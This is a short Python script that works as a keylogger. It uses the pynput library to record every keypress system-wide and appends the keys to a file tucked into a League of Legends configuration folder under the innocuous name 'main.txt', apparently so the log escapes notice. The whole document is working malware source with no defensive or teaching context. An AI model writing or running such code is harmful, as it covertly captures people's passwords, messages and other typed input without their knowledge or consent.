from pynput.keyboard import Key, Listener
import re

filelog = 'C:/Riot Games/League of Legends/Config/main.txt'

def x(k):
    k = str(k)
    k = re.sub(r'/', '', k)
    k = re.sub('Key.delete', '  ', k)
    k = re.sub('Key.space', '  ', k)
    k = re.sub('Key.enter', ' enter ', k)
    k = re.sub('Key.backspace', ' backspace ', k)
    
    # Convertendo eventos especiais para strings específicas
    if k == 'Key.backspace':
        k = 'backspace'
    elif k == 'Key.space':
        k = 'space'
    elif k == 'Key.enter':
        k = 'enter'
    elif k == 'Key.delete':
        k = 'delete'
    else:
        k = k.replace("'", "")

    with open(filelog, 'a') as log:
        log.write(k)

with Listener(on_press=x) as l:
    l.join()
